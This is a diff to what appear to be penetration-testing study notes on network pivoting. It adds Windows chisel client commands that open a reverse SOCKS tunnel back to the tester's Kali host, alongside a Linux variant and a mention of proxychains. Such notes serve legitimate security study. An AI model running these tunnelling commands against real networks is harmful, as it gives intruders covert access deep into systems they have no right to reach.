@@ -262,7 +262,9 @@ https://www.youtube.com/watch?v=uTcrbNBcoxQ
 		
 		6. If you need all services, you can do this in SSH Pivot Machine
 		./chisel client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:socks
-		
+		.\chisel.exe client --fingerprint hlvnjToetcetcroQ= OriginalIPKALI:8080 R:socks
+		Or you can do this as well:
+		.\chisel.exe client OriginalIPKALI:8080 R:socks
 		
 		however you need proxychains.
 		Back in Kali on the chisel server --socks5 --reverse:
